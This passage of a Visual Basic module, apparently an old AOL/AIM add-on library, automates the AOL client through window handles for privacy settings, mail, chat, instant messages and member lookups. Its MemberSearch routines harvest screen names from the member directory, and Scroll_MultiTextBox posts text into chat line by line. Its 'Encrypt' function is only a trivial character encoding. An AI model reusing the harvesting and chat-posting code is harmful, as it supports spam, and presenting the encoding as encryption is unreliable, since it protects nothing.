chk& = GetWindow(chk&, GW_HWNDNEXT)
chk& = GetWindow(chk&, GW_HWNDNEXT)
chk& = GetWindow(chk&, GW_HWNDNEXT)
chk& = GetWindow(chk&, GW_HWNDNEXT)
chk& = GetWindow(chk&, GW_HWNDNEXT)

Call ClickButton(chk&)
Do: DoEvents
numWin& = FindWindow("#32770", vbNullString)
If numWin& <> 0 Then Exit Do
Loop
DoEvents
Call SendMessage(numWin&, WM_CLOSE, 0, 0&)
Call SendMessage(Tit2&, WM_CLOSE, 0, 0&)
End Sub

Sub Ghost_On()
'this turns your Privacy Preferences on to
'Block all AOL users

Dim aol As Long, mdi As Long, Tit As Long, icona As Long, _
Tit2 As Long, IconB As Long, g As Long, chk As Long, tit3 As Long, _
numWin As Long, chil As Long
Do: DoEvents
aol& = FindWindow("AOL Frame25", vbNullString)
mdi& = FindWindowEx(aol&, 0&, "MDIClient", vbNullString)
chil& = FindWindowEx(mdi&, 0&, "AOL Child", vbNullString)
Tit& = FindChildByTitle(mdi&, chil&, "Buddy List Window")
    If Tit& = 0 Then 'makes sure Buddy List Window
        Call RunMenuByChar(9, "V") 'is up
    End If
If Tit& <> 0 Then Exit Do
Loop

icona& = FindWindowEx(Tit&, 0&, "_AOL_Icon", vbNullString)
    icona& = GetWindow(icona&, GW_HWNDNEXT)
                  icona& = GetWindow(icona&, GW_HWNDNEXT)
            icona& = GetWindow(icona&, GW_HWNDNEXT)
            icona& = GetWindow(icona&, GW_HWNDNEXT)
    Call ClickButton(icona&)
    
Do: DoEvents
Tit2& = FindChildByTitle(mdi&, chil&, "'s Buddy List")
IconB& = FindWindowEx(Tit2&, 0&, "_AOL_Icon", vbNullString)
If Tit2& <> 0 And IconB& <> 0 Then Exit Do
Loop

    IconB& = GetWindow(IconB&, GW_HWNDNEXT)
            IconB& = GetWindow(IconB&, GW_HWNDNEXT)
                IconB& = GetWindow(IconB&, GW_HWNDNEXT)
                    IconB& = GetWindow(IconB&, GW_HWNDNEXT)
                        
    Call ClickButton(IconB&)
Wait (0.2)
Do: DoEvents
tit3& = FindChildByTitle(mdi&, chil&, "Privacy Preferences")
chk& = FindWindowEx(tit3&, 0&, "_AOL_Checkbox", vbNullString)
If tit3& <> 0 And chk& <> 0 Then Exit Do
Loop

      chk& = GetWindow(chk&, GW_HWNDNEXT)
    chk& = GetWindow(chk&, GW_HWNDNEXT)
    Do: DoEvents
    Call SendMessage(chk&, BM_SETCHECK, True, 0&)
    g& = SendMessage(chk&, BM_GETCHECK, 0, 0&)
    If g& <> 0 Then Exit Do
    Loop
    chk& = GetWindow(chk&, GW_HWNDNEXT)
    chk& = GetWindow(chk&, GW_HWNDNEXT)
        Dim GetIt As Long
        Do: DoEvents
                Call ClickButton(chk&)
                          GetIt& = SendMessage(chk&, BM_GETCHECK, 0, 0&)
                        If GetIt& <> 0 Then Exit Do
                        Loop

chk& = GetWindow(chk&, GW_HWNDNEXT)
    chk& = GetWindow(chk&, GW_HWNDNEXT)
    chk& = GetWindow(chk&, GW_HWNDNEXT)
   
    Do: DoEvents
                   Call SendMessage(chk&, BM_SETCHECK, True, 0&)
 GetIt& = SendMessage(chk&, BM_GETCHECK, 0, 0&)
                        If GetIt& <> 0 Then Exit Do
                        Loop

chk& = GetWindow(chk&, GW_HWNDNEXT)
chk& = GetWindow(chk&, GW_HWNDNEXT)
chk& = GetWindow(chk&, GW_HWNDNEXT)
chk& = GetWindow(chk&, GW_HWNDNEXT)
chk& = GetWindow(chk&, GW_HWNDNEXT) 'listbox
chk& = GetWindow(chk&, GW_HWNDNEXT)
chk& = GetWindow(chk&, GW_HWNDNEXT)

Call ClickButton(chk&)
Do: DoEvents
numWin& = FindWindow("#32770", vbNullString)
If numWin& <> 0 Then Exit Do
Loop
DoEvents
Call SendMessage(numWin&, WM_CLOSE, 0, 0&)
Call SendMessage(Tit2&, WM_CLOSE, 0, 0&)
End Sub

Function Im_IsVisible() As Boolean
On Error Resume Next
Dim aol As Long, mdi As Long, Tit As Long, Tit2 As Long, _
tit3 As Long, FTit As Long, chil As Long
aol& = FindWindow("AOL Frame25", vbNullString)
mdi& = FindWindowEx(aol&, 0&, "MDIClient", vbNullString)
chil& = FindWindowEx(mdi&, 0&, "AOL Child", vbNullString)
Tit& = FindChildByTitle(mdi&, chil&, ">Instant Message From:")
Tit2& = FindChildByTitle(mdi&, chil&, " Instant Message From:")
tit3& = FindChildByTitle(mdi&, chil&, " Instant Message To:")
If Tit& <> 0 Then
    FTit& = Tit&
        ElseIf Tit2& <> 0 Then
    FTit& = Tit2&
            ElseIf tit3& <> 0 Then
    FTit& = tit3&
        End If
If FTit& <> 0 Then
    Im_IsVisible = True
Else
    Im_IsVisible = False
End If

End Function
Sub List_HelpFile(Lis As ListBox, txt As TextBox)
'compares whats in a textbox to whats in
'a list then will select the nearest match
'just like the search in VB's help file
'PUT THIS IN THE TEXTBOX'S CHANGE EVENT
On Error Resume Next

Dim i As Integer
Dim l As String
If txt.Text = "" Then Lis.Selected(0) = True
If txt.Text <> "" Then
For i = 0 To Lis.ListCount
l$ = LCase(Lis.List(i))
If InStr(l$, LCase(txt.Text)) <> 0 Then
Lis.Selected(i) = True
Exit For
End If
Next i
End If
End Sub

Function List_IsNameListed(Lis As ListBox, name As String) As Boolean
Dim i As Integer, There As Boolean, l As String
There = False
For i = 0 To Lis.ListCount - 1
    l$ = Lis.List(i)
    If LCase(name) = LCase(l$) Then
        There = True
    End If
Next i
List_IsNameListed = There
End Function

Function Mail_CountOld()
Call Mail_OpenOld
Wait (1)
Dim aol As Long, mdi As Long, Tit As Long, chil As Long, _
tab1 As Long, tab2 As Long, tree As Long, c As Integer
Do: DoEvents
aol& = FindWindow("AOL Frame25", vbNullString)
mdi& = FindWindowEx(aol&, 0&, "MDIClient", vbNullString)
chil& = FindWindowEx(mdi&, 0&, "AOL Child", vbNullString)
Tit& = FindChildByTitle(mdi&, chil&, " Online Mailbox")
tab1& = FindWindowEx(Tit&, 0&, "_AOL_TabControl", vbNullString)
tab2& = FindWindowEx(tab1&, 0&, "_AOL_TabPage", vbNullString)
tab2& = GetWindow(tab2&, GW_HWNDNEXT)
tree& = FindWindowEx(tab2&, 0&, "_AOL_Tree", vbNullString)
Loop Until tree& <> 0
Dim LoadAll As Integer
Wait (0.5)
    Do: DoEvents
        c = SendMessage(tree&, LB_GETCOUNT, 0, 0&)
    If LoadAll = c Then
            Exit Do
    Else
            LoadAll = c
            Wait (0.3)
    End If
    Loop
Mail_CountOld = c
Call SendMessage(Tit&, WM_CLOSE, 0, 0&)

End Function
Sub Mail_OpenOld()
If Not (Aol_Version = "4") Then
    Call RunAOLMenu(3, 12)
Else
    Call RunAOLMenu(3, 9)
End If

End Sub


Sub Mail_OpenSent()
If Not (Aol_Version = "4") Then
    Call RunAOLMenu(3, 11)
Else
    Call RunAOLMenu(3, 8)
End If

End Sub

Sub Menu_SubMenuSetPic(Frm As Form, img As Image, MenuNum As Integer, SubInd As Integer, Ind As Integer)
'Sets a pic in the sub menu of a menu item
'the SubInd is the number of the menu that holds a submenu
'and the Ind is the Submenu # that you want the pic in
Dim MMenuHwnd As Long, SMenuHwnd As Long, lRet As Long, SubMenuHwnd As Long
MMenuHwnd = GetMenu(Frm.hwnd)
SMenuHwnd = GetSubMenu(MMenuHwnd, MenuNum)
    SubMenuHwnd = GetSubMenu(SMenuHwnd, SubInd)
    lRet = SetMenuItemBitmaps(SubMenuHwnd, Ind, MF_BYPOSITION, img.Picture, img.Picture)
End Sub

Sub MenuSetPic(Frm As Form, img As Image, MenuNum As Integer, Ind As Integer)
'Adds a picture to your menus
'Picture in ImageBox must be a Bitmap(.Bmp)
'Ind = the number of the menu first item is 0
'second is 1 and so on .Picture must be small
Dim MMenuHwnd As Long, lRet As Long, SubMHwnd As Long
Dim SetPic
MMenuHwnd = GetMenu(Frm.hwnd)
    SubMHwnd = GetSubMenu(MMenuHwnd, MenuNum)
    SetPic = SetMenuItemBitmaps(SubMHwnd, Ind, MF_BYPOSITION, img.Picture, img.Picture)
End Sub

Sub Object_Slide(Frm As Form, Obj As Object)
'put in a timer with low interval
'makes object (picturebox,commandbuton etc)
'slide back an forth on form
Obj.Move Val(Obj.Left) - 55, Obj.Top
If Obj.Left <= 0 Then
Do Until (Obj.Left + Obj.Width) >= Frm.Width
Obj.Move Val(Obj.Left) + 55, Obj.Top
Wait (0.01)
Loop
End If
End Sub
Sub Object_SlideFast(Frm As Form, Obj As Object)
'put in a timer with low interval
'makes object (picturebox,commandbuton etc)
'slide back an forth on form
Obj.Move Val(Obj.Left) - 100, Obj.Top
If Obj.Left <= 0 Then
Do Until (Obj.Left + Obj.Width) >= Frm.Width
Obj.Move Val(Obj.Left) + 100, Obj.Top
Wait (0.01)
Loop
End If
End Sub

Sub PictureTile(Frm As Form, Pic As PictureBox)
Dim i As Integer, t As Integer
Frm.AutoRedraw = True
Pic.BorderStyle = 0
For t = 0 To Frm.Height Step Pic.ScaleHeight

            For i = 0 To Frm.Width Step Pic.ScaleWidth
                Frm.PaintPicture Pic.Picture, i, t
            Next i

            Next t
End Sub
Sub PictureTile2(Frm As Form, Pic As PictureBox, LPic As String)
Dim i As Integer, t As Integer
Pic.Picture = LoadPicture(LPic)
Frm.AutoRedraw = True
Pic.BorderStyle = 0
For t = 0 To Frm.Height Step Pic.ScaleHeight

            For i = 0 To Frm.Width Step Pic.ScaleWidth
                Frm.PaintPicture Pic.Picture, i, t
            Next i

            Next t
End Sub
Sub PictureStretch(Frm As Form, Pic As PictureBox)
'will stretch a picture in a picture box and paint
'on the form background
    Frm.DrawStyle = 6
    Frm.DrawWidth = 1
    Frm.AutoRedraw = True
    
Frm.PaintPicture Pic, 0, 0, Frm.Width, Frm.Height

Pic.Visible = False
Frm.Refresh
End Sub
Sub Print_PrintText(txt As String)
Printer.Print txt
Wait (0.4)
Printer.EndDoc

End Sub


Sub Scroll_MultiTextBox(txt As TextBox)
txt.Text = " " & txt.Text & Chr(13) 'make sure it picks up last line
Dim i As Integer, l As String, TLine As String
For i = 1 To Len(txt.Text)
l$ = Mid(txt.Text, i, 1)
If l$ = Chr(13) Then
Call ChatSend(Mid(TLine$, 2, Len(TLine$))): TLine$ = "": l$ = ""
Wait (0.5)
End If
TLine$ = TLine$ & l$
Next i
txt.Text = Mid(txt.Text, 2, Len(txt.Text) - 2) 'return text to original

End Sub


Sub SignOff()
Dim aol As Long
aol& = FindWindow("AOL Frame25", vbNullString)
Call RunMenuByString(aol&, "&Sign Off")
End Sub

Function TrimSpaces(OStrin As String) As String
'get's rid of all spaces inside string and outside
Dim l As String, i As Integer, NStrin As String
For i = 1 To Len(OStrin)
    l$ = Mid(OStrin, i, 1)
    If l$ = " " Then l$ = ""

    NStrin$ = NStrin$ & l$
Next i
TrimSpaces = NStrin$

End Function

Function UploadStat_File() As String
Dim moda As Long, Stat As Integer
Dim File As String, Mstat As String

Stat = InStr(Modal_Static, "Now Uploading")
    If Stat > 0 Then
        Mstat = Modal_Static
        File = Mid(Mstat, 15, Len(Mstat))
        UploadStat_File = File
    Else
        UploadStat_File = "0"
    End If
    

End Function

Function UploadStat_Percent() As Integer
Dim moda As Long, Stat As Integer
Dim Mstat As String, wtext As String, _
Buffa As String, Lent As Long

moda& = FindWindow("_AOL_Modal", vbNullString)
Stat = InStr(Modal_Static, "Now Uploading")
Mstat = Modal_Static

Lent& = GetWindowTextLength(moda&)
Buffa$ = String$(200, 0)
Call GetWindowText(moda&, Buffa$, (Lent& + 1))
UploadStat_Percent = (Mid(Buffa$, 17, InStr(Buffa$, "%") - 17))

End Function
Sub WelcomeWindow_Show()
Dim aol As Long, mdi As Long, chil As Long, Tit As Long, X
aol& = FindWindow("AOL Frame25", vbNullString)
mdi& = FindWindowEx(aol&, 0&, "MDIClient", vbNullString)
chil& = FindWindowEx(mdi&, 0&, "AOL Child", vbNullString)
Tit& = FindChildByTitle(mdi&, chil&, "Welcome")
If Tit& <> 0 Then
X = ShowWindow(Tit&, SW_SHOW)
End If

End Sub

Sub WelcomeWindow_Hide()
Dim aol As Long, mdi As Long, Tit As Long, chil As Long, X

aol& = FindWindow("AOL Frame25", vbNullString)
mdi& = FindWindowEx(aol&, 0&, "MDIClient", vbNullString)
chil& = FindWindowEx(mdi&, 0&, "AOL Child", vbNullString)
Tit& = FindChildByTitle(mdi&, chil&, "Welcome")
If Tit& <> 0 Then
X = ShowWindow(Tit&, SW_HIDE)
End If

End Sub

Function IsChar(Char As String) As Boolean
'tells if one character is a letter
'use this to test if a number or letter
'was entered..one character at a time though
Dim isit As Boolean
If UCase(Char) Like "[A-Z]" = True Then
isit = True
Else
isit = False
End If
IsChar = isit
End Function

Function IsNumInString(strin As String) As Boolean
'checks if any #'s are in a string
'True means there is a number in it False
'means its all letters
Dim i As Integer, l$
For i = 1 To Len(strin)
l$ = Mid(strin, i, 1)
If IsChar(l$) = False Then
IsNumInString = True
Exit Function
End If
Next i
IsNumInString = False
End Function








Sub Mail_OpenNew()
Dim aol As Long, tool As Long, ToolB As Long, icona As Long

aol& = FindWindow("AOL Frame25", vbNullString)
tool& = FindWindowEx(aol&, 0&, "AOL Toolbar", vbNullString)
ToolB& = FindWindowEx(tool&, 0&, "_AOL_Toolbar", vbNullString)
icona& = FindWindowEx(ToolB&, 0&, "_AOL_Icon", vbNullString)

Call ClickButton(icona&)

End Sub




Function MyProgIsRunning() As Boolean

    MyProgIsRunning = False

    If (App.PrevInstance = True) Then
        MyProgIsRunning = True
    End If

    End Function

Sub Aim_AddRoom(ListB As ListBox)
On Error Resume Next
Dim Chat As Long, Lis As Long, HML, Lent As Long, _
Aimn$, i As Integer

Chat& = FindWindow("AIM_ChatWnd", vbNullString)
Lis& = FindWindowEx(Chat&, 0&, "_Oscar_Tree", vbNullString)
HML = SendMessage(Lis&, LB_GETCOUNT, 0, 0&)
For i = 0 To (HML - 1)
Lent& = SendMessage(Lis&, LB_GETTEXTLEN, i, 0&)
    Aimn$ = String(Lent& + 1, 0)
    Call SendMessageByString(Lis&, LB_GETTEXT, i, Aimn$)
If Aimn$ <> Aim_GetUser Then
ListB.AddItem Aimn$
End If
Next i
End Sub








Function Aim_ChatRoomTitle()
Dim Chat As Long, Lent As Long, Strn$, _
Turn$, final$

Chat& = FindWindow("AIM_ChatWnd", vbNullString)
Lent& = GetWindowTextLength(Chat&)
Strn$ = String$(200, 0)
Call GetWindowText(Chat&, Strn$, (Lent& + 1))
Turn$ = CStr(Strn$)
final$ = Mid(Turn$, 12, Len(Turn$))

Aim_ChatRoomTitle = final$
End Function

Sub Aim_ChatSend(Wat As String)
Dim Chat As Long, Sep As Long, Sep2 As Long

Chat& = FindWindow("AIM_ChatWnd", vbNullString)
Sep& = FindWindowEx(Chat&, 0&, "_Oscar_Separator", vbNullString)
Sep2& = GetWindow(Sep&, GW_HWNDNEXT)
Call SendMessageByString(Sep2&, WM_SETTEXT, 0, Wat$)
DoEvents
Sep2& = GetWindow(Sep2&, GW_HWNDNEXT)
Sep2& = GetWindow(Sep2&, GW_HWNDNEXT)
Sep2& = GetWindow(Sep2&, GW_HWNDNEXT)

Call ClickButton(Sep2&)


End Sub


Function Aim_GetUser()
Dim Aim As Long, l&, Stri$, AimName$

Aim& = FindWindow("_Oscar_BuddyListWin", vbNullString)
l& = GetWindowTextLength(Aim&)
Stri$ = String$(200, 0)
Call GetWindowText(Aim&, Stri$, (l& + 1))
AimName$ = Mid(Stri$, 1, (InStr(Stri$, "'") - 1))
Aim_GetUser = AimName$
End Function


Function Aim_Online() As Boolean
'returns if your on or not..True or False
Dim win As Long, ThereOn As Boolean

win& = FindWindow("_Oscar_BuddyListWin", vbNullString)
If win& <> 0 Then
ThereOn = True
Else
ThereOn = False
End If
Aim_Online = ThereOn
End Function



Function CheckIfOnline(SN As String) As Boolean
'returns a true or false
'example.. if CheckIfOnline("User123") = true then
'msgbox("He's online")
'End if
Dim aol As Long, mdi As Long, Tit As Long, Edi As Long, icona As Long, _
No As Long, Tit2 As Long, AreThey As Boolean, chil As Long
Call RunMenuByChar(9, "L")
Do: DoEvents
aol& = FindWindow("AOL Frame25", vbNullString)
mdi& = FindWindowEx(aol&, 0&, "MDIClient", vbNullString)
chil& = FindWindowEx(mdi&, 0&, "AOL Child", vbNullString)
Tit& = FindChildByTitle(mdi&, chil&, "Locate Member Online")
Edi& = FindWindowEx(Tit&, 0&, "_AOL_Edit", vbNullString)

If Tit& <> 0 And Edi& <> 0 Then Exit Do
Loop
Call SendMessageByString(Edi&, WM_SETTEXT, 0, SN)
icona& = FindWindowEx(Tit&, 0&, "_AOL_Icon", vbNullString)
Call ClickButton(icona&)

Do: DoEvents
No& = FindWindow("#32770", vbNullString)
Tit2& = FindChildByTitle(mdi&, chil&, "Locate " & SN)
If No& <> 0 Or Tit2& <> 0 Then Exit Do
Loop
If No& <> 0 Then
Call SendMessage(No&, WM_CLOSE, 0, 0&)
Call SendMessage(Tit&, WM_CLOSE, 0, 0&)
AreThey = False
ElseIf Tit2& <> 0 Then
Call SendMessage(Tit2&, WM_CLOSE, 0, 0&)
Call SendMessage(Tit&, WM_CLOSE, 0, 0&)
AreThey = True
End If
CheckIfOnline = AreThey
End Function
Public Function Decrypt(strin As String)
Dim X As Long, l$, NextL$, _
Ch
If IsNumeric(Mid(strin, 1, 1)) = False Then
Decrypt = strin
Exit Function
End If
X = 1

While X <= Len(strin)
l$ = Mid(strin, X, 1)
    If l$ = "-" Then
    Let l$ = ""
    NextL$ = NextL$ & Chr(Ch)
    Ch = ""
        ElseIf l$ = "." Then
        Let l$ = ""
        NextL$ = NextL$ & Chr(Ch)
        Ch = ""
            ElseIf l$ = "=" Then
            Let l$ = ""
            NextL$ = NextL$ & Chr(Ch)
            Ch = ""
                ElseIf l$ = "\" Then
                Let l$ = ""
                NextL$ = NextL$ & Chr(Ch)
                Ch = ""
                    ElseIf l$ = "+" Then
                    Let l$ = ""
                    NextL$ = NextL$ & Chr(Ch)
                    Ch = ""
                        ElseIf l$ = "~" Then
                        Let l$ = ""
                        NextL$ = NextL$ & Chr(Ch)
                        Ch = ""
                             ElseIf l$ = "*" Then
                             Let l$ = ""
                             NextL$ = NextL$ & Chr(Ch)
                             Ch = ""
                               ElseIf l$ = "&" Then
                               Let l$ = ""
                               NextL$ = NextL$ & Chr(Ch)
                               Ch = ""
                             End If
                Ch = Ch & l$
    X = X + 1
    Wend
Decrypt = NextL$
End Function

Function Encrypt(strin As String)
Dim Choice, l$, Conv$, X As Integer
On Error Resume Next
Choice = Array("-", "-", ".", "=", "\", "+", "~", "*", "&")
For X = 1 To Len(strin)
DoEvents
l$ = Mid(strin, X, 1)
Conv$ = Conv$ & CharToChr(l$) & Choice(Int(Rnd * 7))
Next X
Encrypt = Conv$
End Function

Function File_Scan(FilePath As String, LookFor As String) As Long
On Error Resume Next
'will return Instr# if string found
'returns 0 if string isnt found
'scan takes longer depending on file size
Dim Free
    Free = FreeFile
    Dim Lookin As Long, X As Integer, txt As String
    Open FilePath$ For Binary Access Read As #Free

    For X = 1 To LOF(Free) Step 32000
        txt$ = Space(32000)
        Get #Free, X, txt$

        If InStr(1, LCase(txt$), LCase(LookFor$), 1) Then
            Lookin = InStr(1, LCase(txt$), LCase(LookFor$), 1)
            File_Scan = (Lookin + X) - 1
            Close #Free
            Exit For
        End If

        Next X

            Close #Free
        End Function


Function FindChatEdit()
Dim Echil As Long, ERich As Long, ERich2 As Long
Echil& = FindChat
ERich& = FindWindowEx(Echil&, 0&, "RICHCNTL", vbNullString)
ERich2& = FindWindowEx(Echil&, ERich&, "RICHCNTL", vbNullString)


FindChatEdit = ERich2&

End Function
Sub IMon()

Call InstantMessage("$IM_on", Plug)

End Sub
Sub IMoff()

Call InstantMessage("$IM_off", Plug)

End Sub
Sub Label_MovieCredit(Lab As Label, name As String)
'set backround color to black
'call this sub for each name
'Try this out at least, i redid it from
'the original cause the old one i made (Not in Hound32)
'kinda hurt your eyes so try this one out i love it
Dim i As Integer, X As Integer, NewC
Lab.Alignment = 2
Lab.Caption = name
Lab.BackStyle = 0
Lab.AutoSize = True

For i = 64 To 1 Step -5
        X = 255 - (i * 4 - 1)
         
        NewC = RGB(X, X, X)
        Lab.ForeColor = NewC
         Wait (0.0000001)
    Next i
Wait (0.8)
For i = 1 To 64 Step 5
        X = 255 - (i * 4 - 1)
         
        NewC = RGB(X, X, X)
        Lab.ForeColor = NewC
         Wait (0.0000001)
    Next i
Lab.ForeColor = &H0&
End Sub
Sub Label_MovieCredit2(Lab As Label, name As String, Num As Integer)
'same as first except you decide how long
'the name will stay in the final white stage
'ex Call Label_MovieCredit(label1,"Hound",1)
'would make hound stay up for a second before
'it starts to fade to black
Lab.Alignment = 2
Lab.Caption = name
Lab.BackStyle = 0
Lab.AutoSize = True
Dim i As Integer, X As Long, NewC
For i = 64 To 1 Step -5
        X = 255 - (i * 4 - 1)

        NewC = RGB(X, X, X)
        Lab.ForeColor = NewC
         Wait (0.0000001)
    Next i
Wait (Num)
For i = 1 To 64 Step 5
        X = 255 - (i * 4 - 1)
         
        NewC = RGB(X, X, X)
        Lab.ForeColor = NewC
         Wait (0.0000001)
    Next i
Lab.ForeColor = &H0&
End Sub

Public Sub AddCharToList(Lis As ListBox)
'this wont add the chr codes
'that windows doesnt recognize
Dim c As Integer, i As Integer

For c = 33 To 126
    Lis.AddItem Chr(c)
Next c

Lis.AddItem Chr(145)

For i = 161 To 255
    Lis.AddItem Chr(i)
Next i
End Sub

Public Sub MemberSearch_Online(LisB As ListBox, SStrin As String)
Dim aol As Long, mdi As Long, chil As Long, t As Integer, _
titl As Long, Edi As Long, Chx As Long, Butn As Long
Dim titl2 As Long, IconC As Long, BWin As Long, _
Lcount As Integer, Lcount2 As Integer, nGood As Boolean, cntr2 As Integer
Dim Lis As Long, Stat As Long, cntr As Integer, LLen As Integer, Lbuf As String, Nam As String
Dim StatLen As Integer, StatBuf As String, NumGoal As String
nGood = False
cntr2 = 0
cntr = 0

Call RunAOLMenu(10, 4)
Wait (0.5)
Do: DoEvents
    aol& = FindWindow("AOL Frame25", vbNullString)
    mdi& = FindWindowEx(aol&, 0&, "MDIClient", vbNullString)
    chil& = FindWindowEx(mdi&, 0&, "AOL Child", vbNullString)
    titl& = FindChildByTitle(mdi&, chil&, "Member Directory")
    Edi& = FindWindowEx(titl&, 0&, "_AOL_Edit", vbNullString)
Loop Until titl& <> 0 And Edi& <> 0
DoEvents
    Edi& = GetWindow(Edi&, GW_HWNDNEXT)
        Edi& = GetWindow(Edi&, GW_HWNDNEXT)
    Edi& = GetWindow(Edi&, GW_HWNDNEXT)
Butn& = Edi&
        For t = 1 To 27
            DoEvents
            Butn& = GetWindow(Butn&, GW_HWNDNEXT)
        Next t
    Chx& = Butn&
    Chx& = GetWindow(Chx&, GW_HWNDNEXT)
    Chx& = GetWindow(Chx&, GW_HWNDNEXT)
    Chx& = GetWindow(Chx&, GW_HWNDNEXT)
    Wait (0.3)
    Call ClickButton(Chx&)
    DoEvents
    Call SendMessageByString(Edi&, WM_SETTEXT, 0, SStrin)
    Call ClickButton(Butn&)
    Wait (1)
    Do: DoEvents
    cntr = cntr + 1
        titl2& = FindChildByTitle(mdi&, chil&, "Search Results")
        Lis& = FindWindowEx(titl2&, 0&, "_AOL_Listbox", vbNullString)
        IconC& = FindWindowEx(titl2&, 0&, "_AOL_Icon", vbNullString)
        Stat& = FindWindowEx(titl2&, 0&, "_AOL_Static", vbNullString)
        BWin& = FindWindow("#32770", vbNullString)
        If BWin& <> 0 Then ' Internal aol error or no matches.
            Call SendMessage(BWin&, WM_CLOSE, 0, 0&)
            Call SendMessage(titl&, WM_CLOSE, 0, 0&)
            Exit Sub
        End If
    Wait (0.5)
    If cntr = 16 Then
        cntr = 0
        Call ClickButton(Butn&)
    End If
    Loop Until IconC& <> 0 And Lis& <> 0
'''''''''''''''Redo
Do: DoEvents
        StatLen = SendMessageByNum(Stat&, 14, 0&, 0&)
        StatBuf$ = Space$(StatLen)
        Call SendMessageByString(Stat&, 13, StatLen + 1, StatBuf$)
        If Len(StatBuf$) > 0 Then
            NumGoal = Mid(StatBuf$, (InStr(StatBuf$, "of") + 3), 2)
            Exit Do
        End If
Loop
        If NumGoal = "ov" Then NumGoal = "100"
        Lcount = SendMessage(Lis&, LB_GETCOUNT, 0, 0&)
            If Not (Lcount = Int(NumGoal)) Then
                Do: DoEvents
                    Wait (1)
                        If nGood = True Then Exit Do
                    Call ClickButton(IconC&)
                        Do: DoEvents
                        Lcount = SendMessage(Lis&, LB_GETCOUNT, 0, 0&)
                        If (Lcount = Int(NumGoal)) Then
                            nGood = True
                            Exit Do
                        End If
                        If IsWindowEnabled(IconC&) = 1 Then
                            Exit Do
                        End If
                        BWin& = FindWindow("#32770", vbNullString)
                        If BWin& <> 0 Then
                            Call SendMessage(BWin&, WM_CLOSE, 0, 0&)
                            nGood = True
                            Exit Do
                        End If
                        Wait (0.3)
                        Loop
                Loop
            End If
'''''''''''''''''''
                            BWin& = FindWindow("#32770", vbNullString)
                    If BWin& <> 0 Then
                        Call SendMessage(BWin&, WM_CLOSE, 0, 0&)
                    End If
''''''ALL ITEMS UP
        Call ReadProcess2Array(Lis&)
         DoEvents
            Call SendMessage(titl&, WM_CLOSE, 0, 0&)
            Call SendMessage(titl2&, WM_CLOSE, 0, 0&)
                BWin& = FindWindow("#32770", vbNullString)
                If BWin& <> 0 Then 'make sure
                    Call SendMessage(BWin&, WM_CLOSE, 0, 0&)
                End If

            For t = 0 To SizeOfPA
            Nam = Mid(ProcessArray(t), 2, (InStr(2, ProcessArray(t), vbTab) - 1))
                If InStr(LCase(Nam), LCase(SStrin)) <> 0 Then
                    LisB.AddItem Nam
                End If
            Next t



End Sub
Public Sub MemberSearch_All(LisB As ListBox, SStrin As String)
Dim aol As Long, mdi As Long, chil As Long, t As Integer, _
titl As Long, Edi As Long, Butn As Long
Dim titl2 As Long, IconC As Long, BWin As Long, _
Lcount As Integer, Lcount2 As Integer, nGood As Boolean, cntr2 As Integer
Dim Lis As Long, Stat As Long, cntr As Integer, LLen As Integer, Lbuf As String, Nam As String
Dim StatLen As Integer, StatBuf As String, NumGoal As String
nGood = False
cntr2 = 0
cntr = 0

Call RunAOLMenu(10, 4)
Wait (0.5)
Do: DoEvents
    aol& = FindWindow("AOL Frame25", vbNullString)
    mdi& = FindWindowEx(aol&, 0&, "MDIClient", vbNullString)
    chil& = FindWindowEx(mdi&, 0&, "AOL Child", vbNullString)
    titl& = FindChildByTitle(mdi&, chil&, "Member Directory")
    Edi& = FindWindowEx(titl&, 0&, "_AOL_Edit", vbNullString)
Loop Until titl& <> 0 And Edi& <> 0
DoEvents
    Edi& = GetWindow(Edi&, GW_HWNDNEXT)
        Edi& = GetWindow(Edi&, GW_HWNDNEXT)
    Edi& = GetWindow(Edi&, GW_HWNDNEXT)
Butn& = Edi&
        For t = 1 To 27
            DoEvents
            Butn& = GetWindow(Butn&, GW_HWNDNEXT)
        Next t
    Wait (0.3)
    DoEvents
    Call SendMessageByString(Edi&, WM_SETTEXT, 0, SStrin)
    Call ClickButton(Butn&)
    Wait (1)
    Do: DoEvents
    cntr = cntr + 1
        titl2& = FindChildByTitle(mdi&, chil&, "Search Results")
        Lis& = FindWindowEx(titl2&, 0&, "_AOL_Listbox", vbNullString)
        IconC& = FindWindowEx(titl2&, 0&, "_AOL_Icon", vbNullString)
        Stat& = FindWindowEx(titl2&, 0&, "_AOL_Static", vbNullString)
        BWin& = FindWindow("#32770", vbNullString)
        If BWin& <> 0 Then ' Internal AOL error or no matches
            Call SendMessage(BWin&, WM_CLOSE, 0, 0&)
            Call SendMessage(titl&, WM_CLOSE, 0, 0&)
            Exit Sub
        End If
    Wait (0.5)
    If cntr = 16 Then
        cntr = 0
        Call ClickButton(Butn&)
    End If
    Loop Until IconC& <> 0 And Lis& <> 0
'''''''''''''''Redo
Do: DoEvents
        StatLen = SendMessageByNum(Stat&, 14, 0&, 0&)
        StatBuf$ = Space$(StatLen)
        Call SendMessageByString(Stat&, 13, StatLen + 1, StatBuf$)
        If Len(StatBuf$) > 0 Then
            NumGoal = Mid(StatBuf$, (InStr(StatBuf$, "of") + 3), 2)
            Exit Do
        End If
Loop
        If NumGoal = "ov" Then NumGoal = "100"
        Lcount = SendMessage(Lis&, LB_GETCOUNT, 0, 0&)
            If Not (Lcount = Int(NumGoal)) Then
                Do: DoEvents
                    Wait (1)
                        If nGood = True Then Exit Do
                    Call ClickButton(IconC&)
                        Do: DoEvents
                        Lcount = SendMessage(Lis&, LB_GETCOUNT, 0, 0&)
                        If (Lcount = Int(NumGoal)) Then
                            nGood = True
                            Exit Do
                        End If
                        If IsWindowEnabled(IconC&) = 1 Then
                            Exit Do
                        End If
                        BWin& = FindWindow("#32770", vbNullString)
                        If BWin& <> 0 Then
                            Call SendMessage(BWin&, WM_CLOSE, 0, 0&)
                            nGood = True
                            Exit Do
                        End If
                        Wait (0.3)
                        Loop
                Loop
            End If
'''''''''''''''''''
                            BWin& = FindWindow("#32770", vbNullString)
                    If BWin& <> 0 Then
                        Call SendMessage(BWin&, WM_CLOSE, 0, 0&)
                    End If
''''''ALL ITEMS UP
        Call ReadProcess2Array(Lis&)
         DoEvents
            Call SendMessage(titl&, WM_CLOSE, 0, 0&)
            Call SendMessage(titl2&, WM_CLOSE, 0, 0&)
                BWin& = FindWindow("#32770", vbNullString)
                If BWin& <> 0 Then 'make sure
                    Call SendMessage(BWin&, WM_CLOSE, 0, 0&)
                End If

            For t = 0 To SizeOfPA
            Nam = Mid(ProcessArray(t), 2, (InStr(2, ProcessArray(t), vbTab) - 1))
                If InStr(LCase(Nam), LCase(SStrin)) <> 0 Then
